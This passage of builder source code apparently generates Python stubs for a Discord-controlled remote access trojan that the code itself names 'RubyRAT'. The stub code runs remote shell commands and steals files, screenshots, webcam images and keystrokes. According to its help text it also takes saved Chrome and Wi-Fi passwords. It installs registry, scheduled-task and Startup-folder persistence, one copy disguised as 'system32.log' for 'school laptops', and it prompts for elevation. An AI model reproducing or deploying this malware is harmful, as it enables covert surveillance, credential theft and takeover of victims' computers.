platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n                await ctx.send(\"Client is using Windows...\")\r\n\r\n                script_path = os.path.abspath(__file__)\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n\r\n                try:\r\n                    if running_as_executable:\r\n                        await ctx.send(\"Client has the **.exe** extension on payload.\")\r\n                        # If the script is an executable\r\n                        executable_path = sys.executable\r\n                        executable_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                        shutil.copy2(executable_path, executable_link_path)\r\n                        print(f\"Executable copied to: {executable_link_path}\")\r\n                    else:\r\n                        # If the script is a .py file\r\n                        if script_path.endswith('.py'):\r\n                            await ctx.send(\"Client has the **.py** extension on payload.\")\r\n                            # Create a duplicate copy of the script in C:\\Users\\Public\\PythonScripts\r\n                            public_folder = os.path.join(os.environ[\"PUBLIC\"], \"PythonScripts\")\r\n                            os.makedirs(public_folder, exist_ok=True)\r\n                            await ctx.send(\"Created PythonScripts directory at **\" + public_folder + \"**\")\r\n                            duplicate_script_path = os.path.join(public_folder, \"DiscordBOT_duplicate.py\")\r\n                            shutil.copy2(script_path, duplicate_script_path)\r\n                            await ctx.send(\"Copied .py file from **\" + script_path + \"** to **\" + duplicate_script_path + \"**\")\r\n\r\n                            # Create a batch script to run the duplicate .py script\r\n                            batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                            batch_script_content = f'@echo off\\n\"{sys.executable}\" \"{duplicate_script_path}\"'\r\n                            with open(batch_script_path, 'w') as batch_file:\r\n                                batch_file.write(batch_script_content)\r\n                            print(f\"Batch script created at: {batch_script_path}\")\r\n                            await ctx.send(f\"Batch script created at: **{batch_script_path}**\")\r\n                        elif script_path.endswith('.pyw'):\r\n                            await ctx.send(\"Client has the **.pyw** extension on payload.\")\r\n                            # Create a duplicate copy of the script in C:\\Users\\Public\\PythonScripts\r\n                            public_folder = os.path.join(os.environ[\"PUBLIC\"], \"PythonScripts\")\r\n                            os.makedirs(public_folder, exist_ok=True)\r\n                            await ctx.send(\"Created PythonScripts directory at **\" + public_folder + \"**\")\r\n                            duplicate_script_path = os.path.join(public_folder, \"DiscordBOT_duplicate.pyw\")\r\n                            shutil.copy2(script_path, duplicate_script_path)\r\n                            await ctx.send(\"Copied .pyw file from **\" + script_path + \"** to **\" + duplicate_script_path + \"**\")\r\n\r\n                            # Create a batch script to run the duplicate .py script\r\n                            batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                            batch_script_content = f'@echo off\\n\"{sys.executable}\" \"{duplicate_script_path}\"'\r\n                            with open(batch_script_path, 'w') as batch_file:\r\n                                batch_file.write(batch_script_content)\r\n                            print(f\"Batch script created at: {batch_script_path}\")\r\n                            await ctx.send(f\"Batch script created at: **{batch_script_path}**\")\r\n                        else:\r\n                            await ctx.send(\"Client has the **.exe** extension on payload.\")\r\n                            # If the script is an .exe file\r\n                            exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                            shutil.copy2(script_path, exe_link_path)\r\n                            print(f\"Executable copied to: **{exe_link_path}**\")\r\n\r\n                    await ctx.send(\"Bot installed on startup!\")\r\n                    print(\"Bot installed on startup!\")\r\n                except Exception as copy_error:\r\n                    await ctx.send(f\"An error occurred while copying the script: {copy_error}\")\r\n                    print(f\"An error occurred while copying the script: {copy_error}\")\r\n            else:\r\n                await ctx.send(\"This feature is only supported on Windows.\")\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as os_error:\r\n            await ctx.send(f\"An error occurred while checking the operating system: {os_error}\")\r\n            print(f\"An error occurred while checking the operating system: {os_error}\")\r\n\r\n@bot.command()\r\nasync def uninstall(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!uninstall':\r\n        print(\"Received !uninstall command\")\r\n        await ctx.send(\"Uninstalling the bot...\")\r\n\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n                await ctx.send(\"Client is using Windows\")\r\n\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n                batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n\r\n                # Remove the batch script and executable link\r\n                if os.path.exists(batch_script_path):\r\n                    secure_delete_file(batch_script_path)\r\n                    print(f\"Batch script removed: {batch_script_path}\")\r\n                    await ctx.send(f\"Batch script removed: **{batch_script_path}**\")\r\n                if os.path.exists(exe_link_path):\r\n                    secure_delete_file(exe_link_path)\r\n                    print(f\"Executable link removed: {exe_link_path}\")\r\n                    await ctx.send(f\"Executable link removed: **{exe_link_path}**\")\r\n\r\n                # Display a message indicating that persistence has been removed\r\n                await ctx.send(\"Bot persistence removed!\")\r\n                print(\"Bot persistence removed!\")\r\n            else:\r\n                await ctx.send(\"This feature is only supported on Windows.\")\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred while uninstalling: {e}\")\r\n            print(f\"An error occurred while uninstalling: {e}\")\r\n\r\n@bot.command()\r\nasync def elevate(ctx):\r\n    if ctx.channel == created_channel:\r\n        if is_admin():\r\n            await ctx.send(\"User has administrative privileges.\")\r\n        else:\r\n            return await ctx.send(elevate_privileges())\r\n\r\n@bot.command()\r\nasync def cat(ctx, file_name):\r\n    if ctx.channel == created_channel:\r\n        try:\r\n            with open(file_name, 'r') as file:\r\n                file_content = file.read()\r\n                await ctx.send(f\"Content of '{file_name}':\\n```\\n{file_content}\\n```\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred while reading the file: {e}\")\r\n\r\n@bot.command()\r\nasync def upload(ctx):\r\n    if ctx.channel == created_channel and ctx.message.attachments:\r\n        attachment = ctx.message.attachments[0]\r\n        await attachment.save(attachment.filename)\r\n        await ctx.send(f\"File '{attachment.filename}' uploaded successfully.\")\r\n    elif not ctx.messege.attachments:\r\n        await ctx.send(f\"File did not upload, you did not attach any files...\")\r\n\r\n# Function to generate a Fernet key from a password\r\ndef generate_key_from_password(password, salt=None):\r\n    if salt is None:\r\n        salt = os.urandom(16)\r\n    kdf = PBKDF2HMAC(\r\n        algorithm=hashes.SHA256(),\r\n        iterations=100000,  # You can adjust the number of iterations as needed\r\n        salt=salt,\r\n        length=32  # Length of the derived key\r\n    )\r\n    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))\r\n    return key, salt\r\n\r\n# Function to encrypt a file\r\ndef encrypt_file(input_file, password):\r\n    try:\r\n        key, salt = generate_key_from_password(password)\r\n        fernet = Fernet(key)\r\n        \r\n        with open(input_file, 'rb') as file:\r\n            file_data = file.read()\r\n        \r\n        encrypted_data = fernet.encrypt(file_data)\r\n        \r\n        # Use the same filename for the encrypted file\r\n        with open(input_file, 'wb') as encrypted_file:\r\n            encrypted_file.write(salt + encrypted_data)\r\n        \r\n        return input_file  # Return the updated input file name\r\n    except InvalidToken:\r\n        return \"Invalid token (key or password)\"\r\n\r\n# Function to decrypt a file\r\ndef decrypt_file(input_file, password):\r\n    try:\r\n        with open(input_file, 'rb') as encrypted_file:\r\n            salt = encrypted_file.read(16)  # Read the salt\r\n            encrypted_data = encrypted_file.read()\r\n        \r\n        key, _ = generate_key_from_password(password, salt)  # Reconstruct the key\r\n        \r\n        fernet = Fernet(key)\r\n        decrypted_data = fernet.decrypt(encrypted_data)\r\n        \r\n        # Use the same filename for the decrypted file\r\n        with open(input_file, 'wb') as decrypted_file:\r\n            decrypted_file.write(decrypted_data)\r\n        \r\n        return input_file  # Return the updated input file name\r\n    except InvalidToken:\r\n        return \"Invalid token (key or password)\"\r\n\r\n@bot.command()\r\nasync def encrypt(ctx, input_file, password):\r\n    if ctx.channel == created_channel:\r\n        encrypted_file_name = encrypt_file(input_file, password)\r\n        await ctx.send(f'File encrypted and saved as {encrypted_file_name}')\r\n        return encrypted_file_name\r\n\r\n@bot.command()\r\nasync def decrypt(ctx, input_file, password):\r\n    if ctx.channel == created_channel:\r\n        decrypted_file_name = decrypt_file(input_file, password)\r\n        if decrypted_file_name != \"Invalid token (key or password)\":\r\n            await ctx.send(f'File decrypted and saved as {decrypted_file_name}')\r\n        else:\r\n            await ctx.send(decrypted_file_name)\r\n\r\ndef has_persistence():\r\n    # Check if the bot has persistence using either the .py or .exe method\r\n    script_path = os.path.abspath(__file__)\r\n    startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n    batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n    exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n    \r\n    return os.path.exists(batch_script_path) or os.path.exists(exe_link_path) or script_path.endswith('.exe')\r\n\r\ndef get_system_info():\r\n    try:\r\n        script_path = os.path.abspath(sys.argv[0])\r\n        info = []\r\n        info.append(f\"System: {platform.system()}\")\r\n        info.append(f\"Node Name: {platform.node()}\")\r\n        info.append(f\"Release: {platform.release()}\")\r\n        info.append(f\"Version: {platform.version()}\")\r\n        info.append(f\"Machine: {platform.machine()}\")\r\n        info.append(f\"Processor: {platform.processor()}\")\r\n\r\n        # Memory information\r\n        memory = psutil.virtual_memory()\r\n        info.append(f\"Memory Total: {convert_bytes(memory.total)}\")\r\n        info.append(f\"Memory Available: {convert_bytes(memory.available)}\")\r\n        info.append(f\"Memory Used: {convert_bytes(memory.used)} ({memory.percent}%)\")\r\n\r\n        # Disk information\r\n        partitions = psutil.disk_partitions()\r\n        for partition in partitions:\r\n            partition_usage = psutil.disk_usage(partition.mountpoint)\r\n            info.append(f\"Disk {partition.device} ({partition.mountpoint}):\")\r\n            info.append(f\"  Total: {convert_bytes(partition_usage.total)}\")\r\n            info.append(f\"  Used: {convert_bytes(partition_usage.used)} ({partition_usage.percent}%)\")\r\n\r\n        # Additional system information\r\n        info.append(f\"Username: {os.getlogin()}\")\r\n        info.append(f\"Device Name: {platform.node()}\")\r\n        info.append(f\"IsAdmin: {is_admin()}\")\r\n        # Check if the bot has installed persistence (.py or .exe)\r\n        info.append(f\"Has Persistence (Reg): {check_registry_persistence(script_path)}\")\r\n        info.append(f\"Has Persistence (Task): {check_task_scheduler_persistence(script_path)}\")\r\n        info.append(f\"Has Persistence (Startup): {check_startup_persistence(script_path)}\")\r\n\r\n        private_ip = socket.gethostbyname(socket.gethostname())\r\n        info.append(f\"Private IP: {private_ip}\")\r\n        info.append(f\"Public IP: {GetPublicIP()}\")\r\n        info.append(f\"Keylogger Activated: {is_logging}\")\r\n\r\n        return '\\n'.join(info)\r\n    except Exception as e:\r\n        return f\"An error occurred while fetching system information: {e}\"\r\n\r\ndef convert_bytes(bytes_value):\r\n    # Convert bytes to human-readable format\r\n    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:\r\n        if bytes_value < 1024:\r\n            return f\"{bytes_value:.2f} {unit}\"\r\n        bytes_value /= 1024\r\n    return f\"{bytes_value:.2f} PB\"\r\n\r\ndef GetPublicIP():\r\n    ip_address = requests.get('https://httpbin.org/ip').json()['origin'] # Get public IP address\r\n    return ip_address\r\n\r\ndef GetLocalIP():\r\n    private_ip = socket.gethostbyname(socket.gethostname())\r\n    return private_ip\r\n\r\ndef CallME(argument):\r\n    try:\r\n        result = subprocess.run(argument, shell=True, text=True, capture_output=True)\r\n        if result.returncode == 0:\r\n            return result.stdout\r\n        else:\r\n            return f\"Command exited with status code {result.returncode}.\\n{result.stderr}\"\r\n    except Exception as e:\r\n        return f\"An error occurred: {e}\"\r\n\r\nasync def DownloadFile(file_name, channel):\r\n    try:\r\n        with open(file_name, 'rb') as file:\r\n            file_content = file.read()\r\n            file_message = await channel.send(file=discord.File(io.BytesIO(file_content), filename=file_name))\r\n            await channel.send(f\"File '{file_name}' uploaded and available for download.\")\r\n    except Exception as e:\r\n        await channel.send(f\"An error occurred while uploading the file: {e}\")\r\n\r\n# check and ask for elevation\r\n# Function for trying to run the script elevated\r\ndef elevate_privileges():\r\n    try:\r\n        admin_pass = ctypes.windll.shell32.ShellExecuteW(None, \"runas\", sys.executable, \" \".join(sys.argv), None, 1)\r\n        if admin_pass > 32:\r\n            return \"Success! You should recive a new connection with a Elevated Client.\" and os._exit(0)\r\n        else:\r\n            return \"User pressed \\\"No\\\". Privilege elevation not successful\"\r\n    except Exception as e:\r\n        return f\"Failed to elevate privileges: {e}\"\r\n    \r\n# Function for getting if user is elevated or not\r\ndef is_admin():\r\n    try:\r\n        # Check if the current process has administrative privileges\r\n        return ctypes.windll.shell32.IsUserAnAdmin() != 0\r\n    except:\r\n        return False\r\n\r\n\r\n# ------------------------------------------------------------\r\n#\r\n#                    SETTINGS STARTS HERE\r\n#\r\n# ------------------------------------------------------------\r\n\r\n# The part that runs on start, asking for elevation.\r\nif askForUACOnStart:\r\n    if is_admin():\r\n        print(\"User has administrative privileges already...\")\r\n    else:\r\n        print(\"User does not have administrative privileges. Requesting it now!\")\r\n        elevate_privileges()\r\nelse:\r\n    print(\"Does not try to ask for UAC on start\")\r\n\r\n# Try to install on start or not..\r\nif installOnStart:\r\n    if has_persistence():\r\n        print(\"Client already has persistence, there is no need to install again.\")\r\n    else:\r\n        print(\"Trying to install on start...\")\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n                current_status = CheckBetterPersistence(script_path)\r\n                # Check and enable Registry Persistence if not already enabled\r\n                if not current_status['registry_persistence']:\r\n                    try:\r\n                        print(\"Starting Registry Persistence phase...\")\r\n                        registry_persistence(script_path)\r\n                        print(\"Registry Persistence done!\")\r\n                    except Exception as e:\r\n                        print(f\"Error starting registry persistence: {e}\")\r\n                else:\r\n                    print(\"Registry Persistence is already active.\")\r\n\r\n                # Check and enable Task Scheduler Persistence if not already enabled\r\n                if not current_status['task_scheduler_persistence']:\r\n                    try:\r\n                        print(\"Starting Task Scheduler Persistence phase...\")\r\n                        task_scheduler_persistence(script_path)\r\n                        print(\"Task Scheduler Persistence done!\")\r\n                    except Exception as e:\r\n                        print(f\"Error starting task scheduler persistence: {e}\")\r\n                else:\r\n                    print(\"Task Scheduler Persistence is already active.\")\r\n\r\n                # Check and enable Startup Persistence if not already enabled\r\n                if not current_status['startup_persistence']:\r\n                    try:\r\n                        print(\"Starting Startup Persistence phase...\")\r\n                        startup_persistence(script_path)\r\n                        print(\"Startup Persistence done!\")\r\n                    except Exception as e:\r\n                        print(f\"Error starting startup persistence: {e}\")\r\n                else:\r\n                    print(\"Startup Persistence is already active.\")\r\n                \r\n                print(\"\\n**Done with all phases! \\nChecking status...**\\n\")\r\n            else:\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as os_error:\r\n            print(f\"An error occurred while checking the operating system: {os_error}\")\r\nelse:\r\n    print(\"Does not install on start!\")\r\n\r\n# ------------------------------------------------------------#\r\n#                     SETTINGS ENDS HERE\r\n#\r\n# ------------------------------------------------------------\r\n\r\nbot.run('" + DBT + "')";
            }
            else if (selectedVersion == "1.9.6")
            {
                originalStub = """
                    import os
                    import platform
                    import subprocess
                    import io
                    import socket
                    import sys
                    import shutil
                    import base64
                    import ctypes
                    import zipfile
                    import importlib

                    # Check if running as executable
                    running_as_executable = getattr(sys, 'frozen', False)


                    # List of required modules and their corresponding import names
                    required_modules = {
                        'psutil': 'psutil',
                        'discord': 'discord',
                        'pyautogui': 'pyautogui',
                        'pillow': 'PIL',
                        'opencv-python-headless': 'cv2',
                        'pynput': 'pynput',
                        'requests': 'requests',
                        'psutil': 'psutil',
                        'cryptography': 'cryptography',
                        'pygetwindow': 'pygetwindow',
                        'googlemaps': 'googlemaps',
                        'tkinter': 'tkinter',
                        'mb': 'mb',
                        'pywin32': 'win32crypt',
                        'pycryptodomex': 'Cryptodome.Cipher',
                        'winreg': 'winreg',
                    }

                    # Additional required module
                    missing_modules = []

                    for module, import_name in required_modules.items():
                        try:
                            # Attempt to import the module
                            importlib.import_module(import_name)
                        except ImportError:
                            # Module is missing, add it to the missing_modules list
                            missing_modules.append(module)

                    # Check and install required modules if needed
                    if missing_modules:
                        missing_modules_str = ", ".join(missing_modules)
                        print(f"Some required modules are missing: {missing_modules_str}")
                        print("Installing missing modules...")
                        try:
                            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing_modules_str.split(', '))
                            print("Modules installed successfully!")
                            # Determine the script filename dynamically
                            script_filename = sys.argv[0]

                            # Build the command to run the script with arguments
                            script_command = [sys.executable, script_filename]

                            # Start a new process to run the script
                            subprocess.Popen(script_command)

                            # Exit the current script
                            sys.exit()
                        except Exception as e:
                            print("An error occurred while installing modules:", e)
                            exit(1)
                    else:
                        print("All required modules are already installed.")


                    import discord
                    from discord.ext import commands
                    import requests
                    import pyautogui
                    from cryptography.fernet import Fernet, InvalidToken
                    from pynput import keyboard
                    from cryptography.hazmat.backends import default_backend
                    from cryptography.hazmat.primitives import hashes
                    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
                    from PIL import Image
                    import cv2
                    import pygetwindow as gw
                    import psutil
                    import googlemaps
                    from tkinter import messagebox as mb
                    import win32crypt
                    from Cryptodome.Cipher import AES
                    import csv
                    import json
                    import shutil
                    import base64
                    import sqlite3
                    import socket
                    import winreg
                    from pathlib import Path


                    # Settings for build
                    installOnStart = 
                    """
                    +
                    cbCTS.Checked
                    +
                    """

                    askForUACOnStart = 
                    """
                    +
                    cbSE.Checked
                    +
                    """

                    categorieName = '
                    """
                    + 
                    txtCategorie.Text 
                    + 
                    """
                    '
                    GOOGLE_API_KEY = '
                    """
                    + 
                    txtGoogleAPI.Text 
                    + 
                    """
                    '
                    currentVersion = '
                    """
                    +
                    selectedVersion
                    +
                    """
                    '

                    # Settings for presistence
                    registryName = '
                    """
                    + 
                    txtPreReg.Text 
                    + 
                    """
                    '
                    taskName = '
                    """
                    + 
                    txtPreTask.Text 
                    + 
                    """
                    '
                    startupName = '
                    """
                    + 
                    txtPreStart.Text 
                    + 
                    """
                    '
                    publicFileName = '
                    """
                    + 
                    txtPrePublic.Text 
                    + 
                    """
                    '

                    intents = discord.Intents.default()
                    intents.message_content = True

                    bot = commands.Bot(command_prefix='!', intents=intents)
                    created_channel = None  # To store the created channel object

                    script_path = os.path.abspath(__file__)

                    @bot.event
                    async def on_ready():
                        print(f'Logged in as {bot.user.name}')

                        # Create encryption key
                        key = Fernet.generate_key()
                        global cipher_suite
                        cipher_suite = Fernet(key)


                        global created_channel  # Declare the global variable
                        system_username = os.getlogin()  # Get the system's username

                        ip_address = requests.get('https://httpbin.org/ip').json()['origin'] # Get public IP address
                        print(f'Public IP Address: {ip_address}')

                        ip_address_with_dashes = ip_address.replace('.', '-')  # Replace periods with dashes

                        # Create the perfect name for chat
                        channel_name = f"{system_username}-{ip_address_with_dashes}"
                        channel_name_lowercase = channel_name.replace('.', '').lower()

                        guild = bot.guilds[0]  # Assuming the bot is in only one guild

                        category = discord.utils.get(guild.categories, name=categorieName) # Checking category to match the desired one
                        print(f'Category Name: {categorieName}')

                        # Execute the remove_channels function with the created_channel and channel_name
                        await remove_channels(guild, channel_name_lowercase)

                        # Find other active RubyRAT clients on local machine
                        try:
                            active_rubyRATs = await find_rubyrats()  # Await the coroutine here
                            if len(active_rubyRATs) > 0:
                                print("Found Python processes:")
                                for process in active_rubyRATs:
                                    print(f"Process ID: {process['pid']}, Name: {process['name']}")
                                    print(f"Trying to kill process: {process}")
                                    await kill_process(process['pid'])  # Kill the process
                            else:
                                print("No Python processes found.")
                        except Exception as e:
                            print("An error occurred:", e)
                        # Kill them...

                        # Create a new text channel with the unique name
                        if category is not None:
                            created_channel = await guild.create_text_channel(channel_name, category=category)
                        else:
                            created_channel = await guild.create_text_channel(channel_name)
                        print(f'Created Channel Name: {created_channel.name}')

                        # Send a message with the public IP address to the new channel
                        await created_channel.send(f"New client! (**Version is {currentVersion}**)\nPublic IP Address of the client: **{ip_address}**. Client is **admin = {is_admin()}**. Also, if you want to know more, type **!help**")

                    @bot.event
                    async def on_message(message):
                        if message.author == bot.user:
                            return

                        # Process !cmd messages
                        if message.channel == created_channel and message.content.startswith('!cmd'):
                            command_args = message.content.split(' ', 1)
                            if len(command_args) == 2:
                                output = CallME(command_args[1])
                                await message.channel.send(output)  # Send the output back to the chat

                        # Process !download messages
                        if message.channel == created_channel and message.content.startswith('!download'):
                            file_name = message.content.split(' ', 1)[1]
                            await DownloadFile(file_name, message.channel)

                        await bot.process_commands(message)

                    async def remove_channels(guild, ChannelName):
                        # Find the category with the specified name
                        category = discord.utils.get(guild.categories, name=categorieName)

                        if category is not None:
                            # Iterate through text channels within the category
                            for channel in category.text_channels:
                                if channel.name == ChannelName:
                                    #await channel.send('!kill2')
                                    #print(f"Sent '!kill2' to channel: {channel.name}")

                                    #await asyncio.sleep(5)
                                    await channel.delete()
                                    print(f"Deleted channel: {channel.name}")
                        else:
                            print(f"Category '{categorieName}' not found in this server.")

                    async def find_rubyrats():
                        try:
                            print("Trying to find RubyRATs...")
                            python_processes = []

                            # Get the current process ID of the script
                            current_process_id = os.getpid()

                            for process in psutil.process_iter(['pid', 'name']):
                                process_info = process.info
                                if "python" in process_info["name"].lower() and process_info["pid"] != current_process_id:
                                    # Check if the process name contains "python" and exclude the script's own process
                                    python_processes.append(process_info)

                            return python_processes
                        except Exception as e:
                            print("An error occurred:", e)
                            return []

                    async def kill_process(pid):
                        try:
                            process = psutil.Process(pid)
                            process.terminate()  # Terminate the process
                            print(f"Killed process with PID {pid}")
                        except psutil.NoSuchProcess:
                            print(f"Process with PID {pid} not found.")
                        except Exception as e:
                            print(f"An error occurred while killing the process with PID {pid}: {e}")

                    # Customize the built-in help command
                    bot.remove_command('help')  # Remove the default help command

                    @bot.command(pass_context=True)
                    async def help(ctx):
                        global created_channel
                        if ctx.channel == created_channel and ctx.message.content == '!help':
                            help_messages = (
                            f"**Available Commands on Version {currentVersion}:**\n"
                            "`!help` - Show this menu.\n"
                            "`!cmd <command>` - Execute a shell command.\n"
                            "`!download <filename>` - Download a file from the system.\n"
                            "`!upload` - Upload a file to the bot.\n"
                            "`!version` - Prints out current version.\n",
                            "`!restart` - Will disconnect and then hopefully reconnect the bot.\n"
                            "`!kill` - Disconnect the bot and remove the chat channel.\n"
                            "`!screenshot` - Sends a frame of desktop from client to chat.\n"
                            "`!webcam` - Takes a picture using clients webcam and sends it in chat.\n"
                            "`!info` - Display some system information, such as GPU, CPU, RAM and more!.\n"
                            "`!elevate` - Will try to elevate client from user to admin.\n",
                            "`!geolocate` - Calculates position using google maps API.\n"
                            "`!install` - Try to get presisence on client system.\n"
                            "`!uninstall` - Will remove presisence from client system.\n"
                            "`!better_install` - Gets presistence on system with 3 diffrent methods. (May need admin)\n"
                            "`!better_uninstall` - Removes 3 diffrent methods of presistence from client system. (May need admin)\n"
                            "`!better_check` - Checks if 3 diffrent methods of presistence is active on client system. (May need admin)\n"
                            "`!history` - Gather and download all web history from client.\n",
                            "`!volume <volume_procent>` - Changes volume to the given procentage.\n"
                            "`!dumplog` - Sends a file containing the keyloggers findings to C2.\n"
                            "`!startlog` - Start the keylogging.\n"
                            "`!stoplog` - Stop the keylogging.\n"
                            "`!encrypt <filename> <password>` - Encrypt a file with a special password.\n"
                            "`!decrypt <filename> <password>` - Decrypt a file with the special password.\n",
                            "`!sendkey <Hello-World>` - Sends specified keys to client. **Instructions here: https://ss64.com/vb/sendkeys.html**\n"
                            "`!cat <filename>` - Display contents of a file (Must be less then 2000 characters...).\n"
                            "`!network` - Retrieve all saved network names their passwords (names with characters like å, ä, ö will not work correctly).\n"
                            "`!passwords_chrome` - If client has chrome, it will retrieve all saved usernames, passwords and URL's to the website.\n"
                            "`!messagebox <error\warning\info> <title> <content>` - Sends a custom made messagebox to client.\n",
                            "`!interactive_cmd` - Starts a CMD terminal in discord. (Avoid using commands that output much information, like \"dir\")\n"
                            )
                            for message in help_messages:
                                await ctx.send(message)    

                    @bot.command()
                    async def kill(ctx):
                        global created_channel
                        if ctx.channel == created_channel and ctx.message.content == '!kill':
                            await ctx.send("Disconnecting and removing chat channel...")
                            if created_channel:
                                await created_channel.delete()
                            await bot.close()
                            os._exit(0)
                    @bot.command()
                    async def info(ctx):
                        if ctx.channel == created_channel and ctx.message.content == '!info':
                            system_info = get_system_info()
                            await ctx.send(f"System Information:\n```\n{system_info}\n```")

                    @bot.command()
                    async def screenshot(ctx):
                        global created_channel
                        if ctx.channel == created_channel and ctx.message.content == '!screenshot':
                            try:
                                # Capture the screenshot using pyautogui
                                screenshot = pyautogui.screenshot()


                                # Save the screenshot to a file
                                screenshot_path = 'screenshot.png'
                                screenshot.save(screenshot_path)

                                # Upload the screenshot to Discord
                                await ctx.send(file=discord.File(screenshot_path))

                                # Remove the temporary file
                                os.remove(screenshot_path)
                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                    @bot.command()
                    async def webcam(ctx):
                        global created_channel

                        if ctx.channel == created_channel and ctx.message.content == '!webcam':
                            try:
                                # Initialize the webcam capture
                                cap = cv2.VideoCapture(0)  # 0 indicates the default webcam

                                if cap.isOpened():
                                    # Capture a single frame from the webcam
                                    ret, frame = cap.read()

                                    if ret:
                                        # Save the captured image to a file
                                        image_path = 'webcam_image.png'
                                        cv2.imwrite(image_path, frame)

                                        # Upload the image to Discord
                                        await ctx.send(file=discord.File(image_path))

                                        # Remove the temporary image file
                                        os.remove(image_path)

                                    else:
                                        await ctx.send("Failed to capture image from webcam.")
                                else:
                                    await ctx.send("Webcam not available.")

                                # Release the webcam
                                cap.release()

                            except Exception as e:
                                await ctx.send(f"An error occurred: {e}")

                    @bot.command()
                    async def version(ctx):
                        if ctx.channel == created_channel:    
                            print(f"Version is {currentVersion}")
                            await ctx.send(f"Current version is {currentVersion}")


                    # ---------------------------------------------------------------------------
                    #
                    #                            TEST ZONE STARTS HERE
                    #
                    # ---------------------------------------------------------------------------




                    # ---------------------------------------------------------------------------
                    #
                    #                              TEST ZONE ENDS HERE
                    #
                    # ---------------------------------------------------------------------------

                    # Cool presistence method that only works for the school laptops.
                    @bot.command()
                    async def cool_install(ctx):
                        if ctx.channel == created_channel:
                            if is_admin():
                                await ctx.send("User has administrative privileges, starting to add persistence...")
                                # Make a new copy with content of current file to "C:\Windows\security\database\system32.log"
                                # Specify the script you want to run
                                script_to_run = 'C:\\Windows\\security\\database\\system32.log'
                                script_path = os.path.abspath(sys.argv[0])

                                # Write your script content to the specified file
                                shutil.copy(script_path, script_to_run)

                                # Add registry that executes "pythonw C:\Windows\security\database\system32.log"
                                registry_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
                                registry_name = 'System32'
                                registry_value = 'pythonw.exe ' + script_to_run

                                try:
                                    import winreg
                                    key = winreg.HKEY_CURRENT_USER
                                    with winreg.OpenKey(key, registry_key, 0, winreg.KEY_WRITE) as registry:
                                        winreg.SetValueEx(registry, registry_name, 0, winreg.REG_SZ, registry_value)
                                    await ctx.send("Persistence added successfully.")
                                except Exception as e:
                                    await ctx.send(f"Failed to add persistence: {str(e)}")
                            else:
                                await ctx.send("You do not have the necessary administrative privileges to perform this operation.")

                    # Removes the cool presistence method that only works for the school laptops.
                    @bot.command()
                    async def cool_uninstall(ctx):
                        if ctx.channel == created_channel:
                            if is_admin():
                                await ctx.send("User has administrative privileges, starting to remove persistence...")

                                # Remove registry key
                                registry_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
                                registry_name = 'System32'

                                try:
                                    # Remove the System32.log file
                                    script_to_run = 'C:\\Windows\\security\\database\\system32.log'
                                    os.remove(script_to_run)

                                    # Remove the registry key
                                    import winreg
                                    key = winreg.HKEY_CURRENT_USER
                                    with winreg.OpenKey(key, registry_key, 0, winreg.KEY_WRITE) as registry:
                                        winreg.DeleteValue(registry, registry_name)
                                    await ctx.send("Persistence removed successfully.")
                                except Exception as e:
                                    await ctx.send(f"Failed to remove persistence: {str(e)}")
                            else:
                                await ctx.send("You do not have the necessary administrative privileges to perform this operation.")


                    # Better presistence method that uses 3 diffrent methods.
                    @bot.command()
                    async def better_install(ctx):
                        if ctx.channel == created_channel and ctx.message.content == "!better_install":
                            script_path = os.path.abspath(sys.argv[0])

                            try:
                                # Check the current persistence status
                                current_status = CheckBetterPersistence(script_path)

                                response = "**Persistence Status:**\n"
                                response += f"Registry Persistence: {'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}\n"
                                response += f"Task Scheduler Persistence: {'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}\n"
                                response += f"Startup Persistence: {'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}\n\n"

                                await ctx.send(response)

                                await ctx.send("\n**Starting...**\n")
                                await ctx.send("Starting Duplicated Script phase...")
                                # Check if the cloned script is in the public directory
                                public_directory = Path('C:/Users/Public')
                                copied_script_path = public_directory / (publicFileName + ".pyw")
                                if (Path(script_path) != copied_script_path):
                                    await ctx.send("Duplicated Script is not in the public directory. Copying...")
                                    # Copy the script to the public directory
                                    shutil.copy(script_path, copied_script_path)
                                    await ctx.send(f"Duplicated Script copied to public directory! (Filename is **{publicFileName}**)")
                                else:
                                    await ctx.send(f"Duplicated Script is already in the public directory. (Filename is **{publicFileName}**)")

                                # Check and enable Registry Persistence if not already enabled
                                if not current_status['registry_persistence']:
                                    try:
                                        await ctx.send("Starting Registry Persistence phase...")
                                        registry_persistence(script_path)
                                        await ctx.send("Registry Persistence done!")
                                    except Exception as e:
                                        await ctx.send(f"Error starting registry persistence: {e}")
                                else:
                                    await ctx.send("Registry Persistence is already active.")

